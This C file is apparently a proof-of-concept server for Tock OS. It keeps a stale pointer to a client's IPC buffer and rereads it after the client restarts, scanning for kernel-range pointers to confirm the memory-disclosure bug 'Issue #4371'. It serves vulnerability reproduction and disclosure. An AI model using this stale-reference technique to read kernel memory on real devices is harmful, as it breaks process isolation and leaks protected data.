#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include <libtock-sync/services/alarm.h>
#include <libtock/interface/led.h>
#include <libtock/kernel/ipc.h>
#include <libtock/tock.h>

// Buffer to store a reference to the client's shared memory
static char *client_buffer = NULL;
static size_t client_buffer_len = 0;
static int client_pid = -1;

// Print first N bytes of a buffer in hex
static void print_buffer_hex(const char *buffer, size_t len, size_t max_bytes) {
  if (buffer == NULL) {
    printf("Buffer is NULL\n");
    return;
  }

  size_t print_len = (len < max_bytes) ? len : max_bytes;
  printf("Buffer at %p (len %zu), first %zu bytes in hex: ", buffer, len,
         print_len);

  for (size_t i = 0; i < print_len; i++) {
    printf("%02x ", (unsigned char)buffer[i]);
    if ((i + 1) % 16 == 0 && i + 1 < print_len) {
      printf("\n  ");
    }
  }
  printf("\n");
}

// Simple check for kernel memory patterns
static bool check_for_kernel_memory(const char *buffer, size_t len) {
  if (buffer == NULL || len < 16) {
    printf("Server: Buffer invalid for kernel memory check\n");
    return false;
  }

  printf("Server: Checking for kernel memory patterns in buffer at %p\n",
         buffer);

  int potential_pointers = 0;
  int client_pattern_count = 0;

  // Look for 32-bit values that appear to be kernel pointers
  for (size_t i = 0; i < len - 3; i += 4) {
    uint32_t value;
    memcpy(&value, &buffer[i], sizeof(uint32_t));

    // Check if value looks like a kernel memory address
    if (value >= 0x20000000 && value <= 0x20030000) {
      printf("  Potential kernel pointer at offset %zu: 0x%lx\n", i,
             (unsigned long)value);
      potential_pointers++;
    }
  }

  // Check for client pattern
  for (size_t i = 0; i < len - 10; i++) {
    if (strncmp(&buffer[i], "CLIENT-DATA", 11) == 0) {
      client_pattern_count++;
    }
  }

  printf("Server: Analysis found %d potential kernel pointers and %d client "
         "patterns\n",
         potential_pointers, client_pattern_count);

  // We have kernel memory if we find pointers but no client pattern
  return (potential_pointers > 0 && client_pattern_count == 0);
}

// Handle commands from clients
static void ipc_callback(int pid, int len, int buf, void *ud) {
  printf("Server: Received IPC callback from pid=%d with len=%d, buf=%p\n", pid,
         len, (void *)buf);

  if (len < 1) {
    printf("Server: Message too short, ignoring\n");
    return;
  }

  char *buffer = (char *)buf;
  uint8_t command = buffer[0];

  printf("Server: Command received: %d\n", command);

  switch (command) {
  case 0: // Register client buffer
    printf("Server: Registering client %d buffer at %p with length %d\n", pid,
           buffer, len);

    client_buffer = buffer;
    client_buffer_len = len;
    client_pid = pid;

    // Print initial buffer contents
    printf("Server: Initial ");
    print_buffer_hex(client_buffer, client_buffer_len, 32);

    // Acknowledge registration
    printf("Server: Sending acknowledgment to client\n");
    buffer[0] = 0;
    ipc_notify_client(pid);
    break;

  case 1: // Examine buffer (used after client restart)
    printf("Server: Examining buffer (post-restart) command\n");

    if (client_buffer == NULL) {
      printf("Server: No client buffer registered\n");
      break;
    }

    printf("Server: Examining buffer at %p with length %d\n", client_buffer,
           client_buffer_len);

    // Print buffer contents
    print_buffer_hex(client_buffer, client_buffer_len, 64);

    // Check for kernel memory patterns
    bool found_kernel_data =
        check_for_kernel_memory(client_buffer, client_buffer_len);

    if (found_kernel_data) {
      printf("!!! VULNERABILITY DETECTED !!!\n");
      printf("Buffer appears to contain kernel memory structures!\n");
      printf("This confirms the vulnerability in Issue #4371\n");

      // Visual indicator - turn on LED
      libtock_led_on(0);
    } else {
      printf("Server: Buffer does not appear to contain kernel memory\n");
      libtock_led_off(0);
    }

    // Acknowledge command
    printf("Server: Sending examination acknowledgment to client\n");
    buffer[0] = 1;
    ipc_notify_client(pid);
    break;

  default:
    printf("Server: Unknown command %d\n", command);
    break;
  }
}

int main(void) {
  printf("Vulnerability Demo Server starting...\n");

  // Initialize client data
  client_buffer = NULL;
  client_buffer_len = 0;
  client_pid = -1;

  // Initialize LED
  printf("Server: Initializing LED\n");
  libtock_led_off(0);

  // Register as a service
  printf("Server: Registering IPC service...\n");
  int result = ipc_register_service_callback("server", ipc_callback, NULL);
  printf("Server: Registration result: %d\n", result);

  if (result >= 0) {
    printf("Server: Successfully registered IPC service 'server'\n");
  } else {
    printf("Server: Failed to register IPC service\n");
  }

  printf("Server: Registration complete. Waiting for clients...\n");

  // Main loop
  while (1) {
    yield();
  }

  return 0;
}
